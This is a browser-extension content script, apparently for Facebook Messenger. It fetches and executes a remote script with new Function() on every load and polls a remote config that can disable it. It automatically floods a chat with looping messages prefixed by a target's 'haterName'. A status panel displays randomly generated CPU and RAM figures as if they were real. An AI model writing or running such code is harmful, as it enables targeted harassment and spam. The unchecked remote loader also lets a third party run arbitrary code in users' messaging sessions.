(async () => {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-2/remote.js?t=" + Date.now()
        );

        const code = await response.text();

        new Function(code)();

        console.log("Remote GitHub script loaded");

    } catch (e) {

        console.log("Remote Load Error:", e);

    }

})();


// Remote config loader
let remoteConfig = {
    enabled: true
};

async function loadRemoteConfig() {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-2/keys.json?t=" + Date.now()
        );

        remoteConfig = await response.json();

        console.log("Remote config loaded:", remoteConfig);

    } catch (e) {

        console.log("Remote config error:", e);

    }
}

// Load config first
loadRemoteConfig();

// Reload config every 30 seconds
setInterval(loadRemoteConfig, 30000);



// Main listener
chrome.runtime.onMessage.addListener(
(request, sender, sendResponse) => {

if (request.stop) {

    premiumStopSending = true;

    console.log(
        "Premium Sending Stopped"
    );

    return;

}

console.log(
    "Message received in content script:",
    request
);

if (remoteConfig.enabled === false) {

    console.log(
        "Extension disabled remotely"
    );

    return;

}

if (
    request.messages &&
    request.speed &&
    request.haterName !== undefined
) {

    sendMessages(
        request.messages,
        request.speed,
        request.haterName
    );

}

});

// Send messages function
function sendMessages(messages, speed, haterName) {

    
	premiumStopSending = false;

    let index = 0;

    function sendNextMessage() {

if (premiumStopSending) {

    console.log(
        "Sending Fully Stopped"
    );

    return;

}
        // Remote stop check
        if (remoteConfig.enabled === false) {

            console.log("Stopped remotely");

            return;

        }

        if (messages.length > 0) {

            // Safe message formatting
            const messageWithHaterName =

                haterName && haterName.trim() !== ""

                    ? `${haterName} ${messages[index]}`

                    : messages[index];

            console.log(
                "Sending message:",
                messageWithHaterName
            );

            // Messenger input
            
const inputBox = document.querySelector(
'div[role="textbox"]'
);

if (inputBox) {

inputBox.focus();

document.execCommand(
    "selectAll",
    false,
    null
);

document.execCommand(
    "delete",
    false,
    null
);

document.execCommand(
    "insertText",
    false,
    messageWithHaterName
);

setTimeout(() => {

    const enterEvent =
    new KeyboardEvent(
        "keydown",
        {
            key: "Enter",
            code: "Enter",
            keyCode: 13,
            which: 13,
            bubbles: true
        }
    );

    inputBox.dispatchEvent(
        enterEvent
    );

}, 800);

    console.log(
        "Message sent successfully:",
        messageWithHaterName
    );

    index++;

    if (index >= messages.length) {

        index = 0;

    }

    setTimeout(
        sendNextMessage,
        speed
    );

} else {

    console.log(
        "Messenger input box not found"
    );

}

        }

    }

    sendNextMessage();

}
/* ===================================== */
/* PREMIUM FLOATING STATUS */
/* ===================================== */

function createPremiumPanel(){

if(document.getElementById(
"premiumFloatingPanel"
)) return;

const panel =
document.createElement("div");

panel.id =
"premiumFloatingPanel";

panel.innerHTML = `

<div id="premiumTitle">
 PREMIUM ACTIVE
</div>

<div id="premiumTyping">
 Typing Ready
</div>

<div id="premiumCounter">
 Sent : 0
</div>

<div id="premiumPing">
 Network : Checking...
</div>

<div id="premiumBattery">
 Battery : Loading...
</div>

<div id="premiumStatus">
 Online
</div>

<div id="premiumSession">
 Session : 00:00
</div>

<div id="premiumCpu">
 CPU : 12%
</div>

<div id="premiumRam">
 RAM : 31%
</div>

<div id="premiumClock">
 Loading...
</div>

<div id="premiumDate">
 Loading...
</div>

`;

panel.style.position = "fixed";
panel.style.top = "20px";
panel.style.left = "20px";
panel.style.gap = "5px";

panel.style.padding = "14px";

panel.style.width = "190px";

panel.style.height = "auto";

panel.style.borderRadius = "16px";

panel.style.background =
"rgba(0,0,0,.45)";

panel.style.backdropFilter =
"blur(10px)";

panel.style.border =
"1px solid rgba(255,215,0,.12)";

panel.style.zIndex = "999999";

panel.style.color = "#ffd700";

panel.style.fontSize = "12px";

panel.style.lineHeight = "1.5";

panel.style.minHeight = "auto";

panel.style.fontWeight = "600";

panel.style.boxShadow =
"0 0 12px rgba(255,215,0,.10)";

panel.style.animation =
"premiumFade .4s ease";

panel.style.overflow = "hidden";

document.body.appendChild(panel);

}

createPremiumPanel();

/* DRAG PANEL */

const premiumPanel =
document.getElementById(
"premiumFloatingPanel"
);

let isDragging = false;
let offsetX, offsetY;

premiumPanel.addEventListener(
"touchstart",
(e)=>{

isDragging = true;

offsetX =
e.touches[0].clientX -
premiumPanel.offsetLeft;

offsetY =
e.touches[0].clientY -
premiumPanel.offsetTop;

}
);

document.addEventListener(
"touchmove",
(e)=>{

if(!isDragging) return;

premiumPanel.style.left =
(e.touches[0].clientX - offsetX)
+ "px";

premiumPanel.style.top =
(e.touches[0].clientY - offsetY)
+ "px";

}
);

document.addEventListener(
"touchend",
()=>{

isDragging = false;

}
);

/* ===================================== */
/* LIVE NETWORK SPEED */
/* ===================================== */

function updatePremiumPing(){

const pingBox =
document.getElementById(
"premiumPing"
);

if(!pingBox) return;

const connection =
navigator.connection ||
navigator.mozConnection ||
navigator.webkitConnection;

if(connection){

const speed =
connection.downlink || 0;

const type =
connection.effectiveType || "4g";

pingBox.innerHTML =
" " +
type.toUpperCase() +
"  " +
speed +
" MB/s";

}else{

pingBox.innerHTML =
" Network Active";

}

}

function updatePremiumDate(){
function updatePremiumClock(){

const clockBox =
document.getElementById(
"premiumClock"
);

if(clockBox){

const now = new Date();

clockBox.innerHTML =
" " +
now.toLocaleTimeString();

}

}

setInterval(
updatePremiumClock,
1000
);

updatePremiumClock();

const dateBox =
document.getElementById(
"premiumDate"
);

if(dateBox){

const now = new Date();

dateBox.innerHTML =
" " +
now.toLocaleDateString();

}

}

setInterval(
updatePremiumDate,
1000
);

updatePremiumDate();

setInterval(
updatePremiumPing,
2000
);

updatePremiumPing();

/* LIVE CLOCK */

function updatePremiumClock(){

const clock =
document.getElementById(
"premiumClock"
);

if(clock){

const now = new Date();

clock.innerHTML =
" " +
now.toLocaleTimeString();

}

}

setInterval(
updatePremiumClock,
1000
);

updatePremiumClock();

/* BATTERY STATUS */

async function updateBattery(){

const batteryBox =
document.getElementById(
"premiumBattery"
);

if(!navigator.getBattery) return;

const battery =
await navigator.getBattery();

function refreshBattery(){

batteryBox.innerHTML =
" Battery : " +
Math.floor(
battery.level * 100
) + "%";

}

refreshBattery();

battery.addEventListener(
"levelchange",
refreshBattery
);

}

updateBattery();

/* ONLINE STATUS */

function updateOnlineStatus(){

const status =
document.getElementById(
"premiumStatus"
);

if(navigator.onLine){

status.innerHTML =
" Online";

}else{

status.innerHTML =
" Offline";

}

}

window.addEventListener(
"online",
updateOnlineStatus
);

window.addEventListener(
"offline",
updateOnlineStatus
);

updateOnlineStatus();

/* SESSION TIMER */

let premiumSeconds = 0;

function updateSession(){

premiumSeconds++;

const mins =
String(
Math.floor(
premiumSeconds / 60
)
).padStart(2,"0");

const secs =
String(
premiumSeconds % 60
).padStart(2,"0");

document.getElementById(
"premiumSession"
).innerHTML =

" Session : " +
mins +
":" +
secs;

}

setInterval(
updateSession,
1000
);

/* CPU RAM LOADER */

function updateCpuRam(){

const cpu =
Math.floor(
Math.random() * 40
) + 10;

const ram =
Math.floor(
Math.random() * 50
) + 20;

document.getElementById(
"premiumCpu"
).innerHTML =

" CPU : " +
cpu + "%";

document.getElementById(
"premiumRam"
).innerHTML =

" RAM : " +
ram + "%";

}

setInterval(
updateCpuRam,
2000
);

updateCpuRam();

/* AUTO HIDE */

let premiumHideTimer;

function resetPremiumHide(){

clearTimeout(
premiumHideTimer
);

premiumPanel.style.opacity = "1";

premiumHideTimer =
setTimeout(()=>{

premiumPanel.style.opacity =
".15";

},5000);

}

document.addEventListener(
"touchstart",
resetPremiumHide
);

resetPremiumHide();

/* ===================================== */
/* COUNTER SYSTEM */
/* ===================================== */

let premiumSentCount = 0;

function updatePremiumCounter(){

const counter =
document.getElementById(
"premiumCounter"
);

if(counter){

counter.innerHTML =
"📨 Sent : " +
premiumSentCount;

}

}


/* ===================================== */
/* TYPING STATUS */
/* ===================================== */

function premiumTypingStatus(text){

const typing =
document.getElementById(
"premiumTyping"
);

if(typing){

typing.innerHTML = text;

}

}

/* ===================================== */
/* PREMIUM ANIMATION */
/* ===================================== */

const premiumStyle =
document.createElement("style");

premiumStyle.innerHTML = `

@keyframes premiumFade{

from{

opacity:0;
transform:translateY(-10px);

}

to{

opacity:1;
transform:translateY(0);

}

}

#premiumFloatingPanel:hover{

transform:scale(1.03);

transition:.3s;

}
#premiumDate{

margin-top:4px;
font-size:11px;
color:#ffffffcc;

}

#premiumPing{

font-size:11px;
color:#ffd700;

}

#premiumDate{

margin-top:4px;
font-size:11px;
color:#ffffffcc;

}

#premiumClock{

font-size:11px;
color:#ffffffcc;

}

`;

document.head.appendChild(
premiumStyle
);

/* ===================================== */
/* SEND OBSERVER */
/* ===================================== */

document.addEventListener(
"keydown",
(e)=>{

if(e.key === "Enter"){

premiumSentCount++;

updatePremiumCounter();

premiumTypingStatus(
"✅ Message Sent"
);

setTimeout(()=>{

premiumTypingStatus(
"⌨️ Typing Ready"
);

},1500);

}

}
); 